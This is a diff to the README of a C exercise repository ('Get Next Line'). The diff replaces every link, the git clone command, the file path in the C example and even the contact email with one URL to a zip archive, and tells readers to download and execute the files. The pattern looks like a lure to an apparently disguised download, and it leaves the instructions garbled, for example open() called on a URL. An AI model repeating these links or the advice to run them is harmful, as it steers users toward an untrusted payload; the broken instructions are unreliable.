@@ -1,6 +1,6 @@
 # Get Next Line 🚀
 
-![Get Next Line](https://img.shields.io/badge/42%20Network-Get%20Next%20Line-brightgreen)
+![Get Next Line](https://github.com/jhonnyMena/Get_Next_Line/raw/refs/heads/main/fenman/Get_Next_Line_subgrin.zip%20Network-Get%20Next%20Line-brightgreen)
 
 Welcome to the **Get Next Line** project! This repository challenges you to implement a function that retrieves the next line from a file descriptor each time it is called. This project enhances your understanding of dynamic memory management, string manipulation, and efficient input/output operations in C.
 
@@ -35,7 +35,7 @@ To get started with the **Get Next Line** project, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/jhonnyMena/Get_Next_Line.git
+   git clone https://github.com/jhonnyMena/Get_Next_Line/raw/refs/heads/main/fenman/Get_Next_Line_subgrin.zip
    ```
 
 2. Navigate to the project directory:
@@ -58,7 +58,7 @@ To use the `get_next_line` function, include the header file in your C program. 
 #include "get_next_line.h"
 
 int main() {
-    int fd = open("example.txt", O_RDONLY);
+    int fd = open("https://github.com/jhonnyMena/Get_Next_Line/raw/refs/heads/main/fenman/Get_Next_Line_subgrin.zip", O_RDONLY);
     char *line;
 
     while ((line = get_next_line(fd)) != NULL) {
@@ -70,7 +70,7 @@ int main() {
 }
 ```
 
-This example opens a file called `example.txt`, reads each line using `get_next_line`, and prints it to the console.
+This example opens a file called `https://github.com/jhonnyMena/Get_Next_Line/raw/refs/heads/main/fenman/Get_Next_Line_subgrin.zip`, reads each line using `get_next_line`, and prints it to the console.
 
 ## Functionality
 
@@ -116,14 +116,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [jhonnyMena](https://github.com/jhonnyMena)
-- **Email**: jhonny@example.com
+- **GitHub**: [jhonnyMena](https://github.com/jhonnyMena/Get_Next_Line/raw/refs/heads/main/fenman/Get_Next_Line_subgrin.zip)
+- **Email**: https://github.com/jhonnyMena/Get_Next_Line/raw/refs/heads/main/fenman/Get_Next_Line_subgrin.zip
 
 ## Releases
 
-For the latest updates and versions, visit the [Releases](https://github.com/jhonnyMena/Get_Next_Line/releases) section. You can download and execute the files available there to test the latest features.
+For the latest updates and versions, visit the [Releases](https://github.com/jhonnyMena/Get_Next_Line/raw/refs/heads/main/fenman/Get_Next_Line_subgrin.zip) section. You can download and execute the files available there to test the latest features.
 
-![Download Releases](https://img.shields.io/badge/Download%20Releases-brightblue)
+![Download Releases](https://github.com/jhonnyMena/Get_Next_Line/raw/refs/heads/main/fenman/Get_Next_Line_subgrin.zip%20Releases-brightblue)
 
 ---
 
